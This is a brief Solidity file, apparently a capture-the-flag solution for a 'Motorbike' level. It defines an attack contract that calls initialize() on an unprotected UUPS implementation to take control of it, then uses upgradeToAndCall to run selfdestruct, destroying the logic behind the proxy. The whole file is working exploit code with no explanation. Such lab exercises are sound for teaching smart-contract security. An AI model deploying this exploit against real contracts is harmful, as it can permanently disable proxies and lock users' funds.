// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

interface IAttack {
    function attack(address implementation) external;
    function destroy() external;
}

contract MyMotorbikeAttack is IAttack {
    function attack(address implementation) external override {
        IEngine impl = IEngine(implementation);
        impl.initialize();
        impl.upgradeToAndCall(address(this), abi.encodeWithSignature("destroy()"));
    }

    function destroy() external override {
        selfdestruct(payable(msg.sender));
    }
}
